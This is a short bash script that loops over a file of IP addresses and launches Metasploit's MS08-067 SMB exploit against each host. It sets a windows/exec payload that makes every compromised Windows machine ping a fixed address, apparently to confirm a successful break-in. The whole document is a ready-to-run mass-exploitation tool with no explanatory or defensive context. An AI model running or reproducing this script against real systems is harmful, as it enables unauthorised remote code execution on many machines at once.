#!/bin/bash

if [ ! $1 ]; then echo "Usage: #./script <host file>"; exit; fi

iplist=$1

for ip in $(cat $iplist)
do
gnome-terminal -x msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST $ip; set PAYLOAD windows/exec; set CMD cmd.exe /c ping 172.16.69.133 -n 1 -i 15; run"
echo "Exploiting $ip and pinging"
i=$(($i+1))
done


